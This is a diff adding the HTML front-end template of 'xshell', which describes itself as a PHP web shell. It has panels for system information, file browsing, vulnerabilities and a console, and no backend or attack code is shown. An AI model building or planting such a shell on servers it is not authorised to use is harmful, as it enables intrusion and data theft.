@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>xshell</title>
+        <meta charset="utf-8" />
+        <script src="version.js"></script>
+        <link rel="stylesheet" type="text/css" href="style.css" />
+        <link rel="stylesheet" type="text/css" href="terminal.css" />
+        <script src="script.js"></script>
+        <!--[if IE]>
+            <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+    </head>
+    <body onload="init(0)">
+        <!-- BEGIN LOADING SCREEN -->
+        <div id="div-loading" class="loading">
+            <h3>Loading</h3>
+            <h4 id="loading-text">Working...</h4>
+        </div>
+        <!-- END LOADING SCREEN -->
+        <!-- BEGIN HEADER -->
+        <header>
+            <div>
+                <span style="color: #e02222;">x</span><span>shell</span> <a href="http://www.quetuo.net/xshell" id="xshell-version"></a>
+            </div>
+        </header>
+        <!-- END HEADER -->
+        <!-- BEGIN CONTAINER -->
+        <div class="container">
+            <!-- BEGIN SIDEBAR -->
+            <div class="sidebar">
+                <ul id="sidebar">
+                    <li>
+                        <form class="sidebar-search">
+                            <input type="text" placeholder="Search..." />
+                        </form> 
+                    </li>
+                    <li data-active="1" data-link="dashboard">Dashboard</li>
+                    <li data-active="0" data-link="information">Information</li>
+                    <li data-active="0" data-link="file-system">File System</li>
+                    <li data-active="0" data-link="vulnerabilities">Vulnerabilities</li>
+                    <li data-active="0" data-link="console">Console</li>
+                    <li data-active="0" data-link="help">Help</li>
+                </ul>
+            </div>
+            <!-- END SIDEBAR -->
+            <!-- BEGIN CONTENT -->
+            <div class="page-content">
+            <!-- Dashboard -->
+            <div class="page-container" id="page-dashboard">
+                <h3>Dashboard <small>overview</small></h3>
+                <div class="page">
+                    <div class="tile double blue" id="tile-software">
+                        <h3>Software</h3>
+                        <p id="p-software"></p>
+                    </div>
+                    <div class="tile double green" id="tile-environment">
+                        <h3>Environment</h3>
+                        <p id="p-environment"></p>
+                    </div>
+                    <div class="tile orange" id="tile-files">
+                        <div class="corner"></div>
+                        <h3>Files</h3>
+                    </div><br style="clear: both"/>
+                    <div class="tile double-down purple" id="tile-services">
+                        <h3>Services</h3>
+                        <p id="p-services"></p>
+                    </div>
+                    <div class="tile double double-down orange" id="tile-log">
+                         <h3>Log</h3>
+                         <p id="p-log"></p>
+                    </div>
+                    <div class="tile double red" id="tile-info">
+                        <h3>Info</h3>
+                        <p>xshell is idle</p>
+                    </div>
+                </div>
+            </div>
+            <!-- Information -->
+            <div class="page-container-hidden" id="page-information">
+                <h3>Information</h3>
+                <div class="page">
+                    <strong>Filename: </strong><span id="span-filename"></span><br />
+                    <strong>PHP Version: </strong><span id="span-php-version"></span><br />
+                    <strong>System: </strong><span id="span-system"></span><br />
+                    <strong>User: </strong><span id="span-user"></span><br />
+                    <strong>Extensions: </strong><span id="span-extensions"></span><br />
+                </div>
+            </div>
+            <!-- File system -->
+            <div class="page-container-hidden" id="page-file-system">
+                <h3>File System <small>overview</small></h3>
+                <div class="page">
+                    <div class="file-browser" data-dir="">
+                        <ul>
+                            <li class="file-browser file-directory">
+                                <h3>.</h3>
+                                <p>Directory</p>
+                            </li>
+                            <li class="file-browser file-directory">
+                                <h3>..</h3>
+                                <p>Directory</p>
+                            </li>
+                            <li class="file-browser file-php">
+                                <h3>index.php</h3>
+                                <p>PHP file</p>
+                            </li>
+                            <li class="file-browser file-php">
+                                <h3>config.php</h3>
+                                <p>PHP file</p>
+                            </li>
+                            <li class="file-browser file-image">
+                                <h3>logo.jpg</h3>
+                                <p>JPEG</p>
+                            </li>
+                            <li class="file-browser file-misc">
+                                <h3>.htaccess</h3>
+                                <p>.htaccess file</p>
+                            </li>
+                            <li class="file-browser file-html">
+                                <h3>template.html</h3>
+                                <p>HTML file</p>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <!-- Vulnerabilities -->
+            <div class="page-container-hidden" id="page-vulnerabilities">
+                <h3>Vulnerabilities <small>potential vulnerabilities</small></h3>
+                <div id="page">
+                    
+                </div>
+            </div>
+            <!-- Console -->
+            <div class="page-container-hidden" id="page-console">
+                <h3>Console</h3>
+                <div class="page">
+                    <div id="console"></div>
+                </div>
+            </div>
+            <!-- Help -->
+            <div class="page-container-hidden" id="page-help">
+                <h3>Help</h3>
+                <div class="page">
+                    <p><strong>xshell</strong> is a PHP web shell written by Quetuo <a href="mailto:quetuo@quetuo.net">&lt;quetuo@quetuo.net&gt;</a></p>
+                    <p>As always, <strong>you</strong> are responsible for your own actions. Do not use xshell on a machine or network on which you are not authorised to do so.</p>
+                </div>
+            </div>
+        </div>
+            <!-- END CONTENT -->
+            <!-- BEGIN RIGHT SIDEBAR -->
+            <div class="right-sidebar">
+                <h3></h3>
+                <img alt="No preview available"></img>
+                <pre class="prettyprint linenums"></pre>
+            </div>
+            <!-- END RIGHT SIDEBAR -->
+        </div>
+        <!-- END CONTAINER -->
+    </body>
+</html>
